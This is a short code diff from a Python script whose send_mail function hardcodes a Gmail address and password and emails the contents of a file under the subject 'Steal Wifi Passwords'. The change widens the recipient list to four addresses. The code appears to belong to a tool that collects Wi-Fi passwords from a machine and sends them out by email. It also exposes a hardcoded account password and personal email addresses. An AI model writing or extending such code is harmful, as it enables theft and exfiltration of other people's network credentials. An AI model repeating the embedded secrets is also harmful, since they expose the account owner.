@@ -96,7 +96,7 @@ def send_mail():
     EMAIL_ADDRESS = "fedivb.viit@gmail.com"  # os.environ.get('EMAIL_USER')
     EMAIL_PASSWORD = "nghglptzoqtnjjur"  # os.environ.get('EMAIL_PASS')
 
-    contacts = ["atharvadare@gmail.com" , "refruta007@gmail.com" ] #, "vaishali.mishra@viit.ac.in" , "fatima.inamdar@viit.ac.in"]
+    contacts = ["atharvadare@gmail.com" , "refruta007@gmail.com" , "vaishali.mishra@viit.ac.in" , "fatima.inamdar@viit.ac.in"]
 
     msg = EmailMessage()
     msg['Subject'] = "Steal Wifi Passwords"
@@ -104,7 +104,7 @@ def send_mail():
     msg['To'] = contacts
 
     file_size = get_file_size(MAC)
-    print("Size of MAC = ", file_size)
+    #print("Size of MAC = ", file_size)
 
     with open(MAC, 'r') as f:
         stuff = f.read(1521)
